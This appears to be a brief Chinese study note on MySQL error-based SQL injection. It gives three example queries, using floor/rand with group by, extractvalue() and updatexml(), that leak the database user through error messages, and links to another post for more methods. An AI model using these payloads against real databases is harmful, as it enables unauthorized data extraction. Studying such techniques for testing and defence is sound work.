##mysql报错注入

###1.floor
> select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
>
> 不知道为啥会多出一个1

### 2.extractvalue()

> select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

### 3.updatexml()

>select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

剩余方法参考此[marinata](https://www.cnblogs.com/wocalieshenmegui/p/5917967.html)

![我噶](/Users/marinata/Downloads/gaki/Gaki7.jpg)

